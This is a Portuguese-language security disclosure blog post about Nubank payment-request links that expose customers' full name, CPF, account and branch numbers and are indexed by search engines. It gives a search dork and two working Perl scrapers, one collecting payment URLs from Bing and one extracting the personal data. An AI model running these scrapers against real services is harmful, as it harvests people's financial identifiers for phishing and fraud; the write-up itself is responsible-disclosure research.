---
layout: content
title: 'Um pequeno caso de scraping de dados pessoais expostos na web'
description: 'Durante a realização de uma pesquisa de segurança em aplicações mobile, foi identificado um recurso no aplicativo do Nubank que permite a criação e o envio de "links de cobrança" para múltiplos destinatários. Foi identificada uma vulnerabilidade nessa funcionalidade que  possibilitou mapear dados pessoais, como CPF, nome completo, número e agência da conta vários clientes.'
og_image: https://heitorgouvea.me/images/publications/nubank-scraping/google-dorks.png
---

Tabela de conteúdo:
- [Resumo](#sumario)
- [Descrição](#descrição)
- [Prova de conceito](#prova-de-conceito)
- [Impacto](#impacto)
- [Conclusão](#conclusão)
- [Referências](#referencias)

### Sumário

Durante a realização de uma pesquisa de segurança em aplicações mobile, foi identificado um recurso no aplicativo do Nubank que permite a criação e o envio de "links de cobrança" para múltiplos destinatários. Foi identificada uma vulnerabilidade nessa funcionalidade que  possibilitou mapear dados pessoais, como CPF, nome completo, número e agência da conta de vários clientes.

**DISCLAIMER**: A empresa responsável foi informada sobre todos os detalhes dessa pesquisa no menor tempo possível e respondeu de maneira ética e transparente, demonstrando atenção e comprometimento com a segurança da funcionalidade. Durante os testes realizados, não houve invasão ou violação de sistemas. Além disso, a empresa implementou algumas medidas corretivas para reduzir os riscos associados ao problema relatado. Recomendações adicionais foram fornecidas para mitigar a vulnerabilidade, porém a empresa optou por não implementá-las integralmente.

- Esta publicação também está dispoível em: [Espanhol](/2020/06/23/caso-de-scraping-de-dados-personales) e [Inglês](/2020/06/23/Scraping-personal-data-exposure-in-the-web);

---

### Descrição

Dentro do aplicativo do Nubank, existe um recurso denominado "Cobrar". Seu funcionamento consiste em:
1. preencher um valor (opcional);
2. clicar em "Confirmar";
3. um QR Code é gerado, e o usuário pode compartilhá-lo ou enviar a cobrança por meio de outros aplicativos, como o WhatsApp:

![](/images/publications/nubank-scraping/creating-a-link.png)

![](/images/publications/nubank-scraping/whatsapp-shared-link.png)


O conteúdo do QR Code é o mesmo link que pode ser compartilhado por aplicativos de mensagens. Quando esse link é aberto no navegador, o seguinte resultado é obtido:

![](/images/publications/nubank-scraping/personal-infos.png)

São expostos, sem qualquer tipo de controle, alguns dados do usuário que gerou o link, como: nome completo, CPF, número da conta bancária e agência. O único requisito para obter essas informações sensíveis[1] é possuir a URL.

A URL é gerada exclusivamente pelo cliente em seu aplicativo, sendo também de responsabilidade do cliente decidir como e com quem compartilhá-la.

Entretanto, essas URLs são indexadas por motores de busca, o que permite a utilização de dorks[2] para identificar mais URLs relacionadas a esse serviço. 

Dork para restringir a busca ao site principal do Nubank, onde as URLs contenham o padrão "/pagar/" e excluam resultados envolvendo o blog:

```text
site:nubank.com.br inurl:/pagar/ -blog
````

Resultado:

![](/images/publications/nubank-scraping/google-dorks.png)

Além disso, foi possível observar que alguns usuários estavam publicando essas URLs em canais públicos, como o Twitter. Um uso comum da funcionalidade seria para o recebimento de doações.

![](/images/publications/nubank-scraping/twitter-links.png)

---

### Prova de conceito

Para demonstrar o impacto do abuso dessa funcionalidade, foi criada uma prova de conceito. A primeira parte consiste na construção de um código capaz de utilizar um motor de busca para coletar o maior número possível de URLs. Foi desenvolvido, então, um scraper[3] utilizando o Bing:

```perl
#!/usr/bin/env perl

use 5.030;
use strict;
use warnings;
use WWW::Mechanize;
use Mojo::Util qw(url_escape);

sub main {
    my $dork = $ARGV[0];

    if ($dork) {
        $dork = url_escape($dork);

        my %seen  = ();
        my $mech = WWW::Mechanize -> new();

        $mech -> ssl_opts (verify_hostname => 0);

        for my $page (0 .. 10) {
            my $url = "https://wwww.bing.com/search?q=${dork}&first=${page}0";

            $mech -> get($url);

            my @links = $mech -> links();

            foreach my $link (@links) {
                $url = $link -> url();

                next if $seen{$url}++;

                if ($url =~ m/^https?/ && $url !~ m/bing|live|microsoft|msn/) {
                    print $url, "\n";
                }
            }
        }
    }
}

exit main();
```

Com esse código, foram coletadas 100 URLs válidas — o número foi limitado a 100 pois o intuito era apenas uma demonstração, por se tratar apenas de uma demonstração, mas poderia ser muito maior:

![](/images/publications/nubank-scraping/file-with-the-urls.png)

Após a coleta das URLs em um arquivo `.txt`, foi desenvolvido outro scraper para extrair os dados das páginas do Nubank:

```perl
#!/usr/bin/env perl

use 5.030;
use strict;
use warnings;
use Mojo::DOM;
use Mojo::UserAgent;

binmode(STDOUT, ":encoding(UTF-8)");

sub main {
    my $urls_file = $ARGV[0];

    if ($urls_file) {
        my $userAgent = Mojo::UserAgent -> new (
            agent => "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)"
        );
        
        open my $urls_filehandle, "<", $urls_file or die $!;

        while (<$urls_filehandle>) {
            chomp ($_);
            
            my $request = $userAgent -> get($_) -> result();

            if ($request -> is_success()) {
                my $account = $request -> dom -> find("tr td") -> map("text") -> join(",");

                $account =~ s/Nome,//
                && $account =~ s/CPF,//
                && $account =~ s/Banco,//
                && $account =~ s/Tipo da conta,//
                && $account =~ s/Agência,//
                && $account =~ s/Conta,//
                && $account =~ s/Agência Métodos,//;

                say $account;
            }
        }

        close ($urls_filehandle);
    }
}

exit main();
```

E então, o resultado obtido:

![](/images/publications/nubank-scraping/collect-with-names-cpfs.png)

CPF, nome completo, número da conta e agência de 100 pessoas, em apenas alguns minutos e com poucas linhas de código.

---

### Impacto

A possibilidade de um atacante abusar dessa funcionalidade disponível nos sistemas do Nubank é alta devido à facildade de exploração. Isso pode expor diversos usuários, vazando informações sensíveis, como demonstrado anteriormente. Além disso, um atacante com posse desses dados pode utilizá-los para aplicar golpes por meio de abordagens de engenharia social extremamente direcionadas.

---

### Conclusão

Esta análise, demosntra que um agente malicioso poderia implementar scrapers para mapear URLs de cobrança do Nubank e, posteriormente, coletar as informações pessoais presentes nessas páginas. O artigo apresentou uma PoC utilizando um motor de busca, mas há espaço para outras possibilidades, como a exploração de dados publicados em redes sociais (Twitter, Facebook, etc.). Esse cenário representa um risco real, podendo tornar clientes do Nubank em alvos de ataques de spear phishing e engenharia social.

---

### Referências

- [1] [https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure)
- [2] [https://en.wikipedia.org/wiki/Google_hacking](https://en.wikipedia.org/wiki/Google_hacking)
- [3] [https://en.wikipedia.org/wiki/Web_scraping](https://en.wikipedia.org/wiki/Web_scraping)
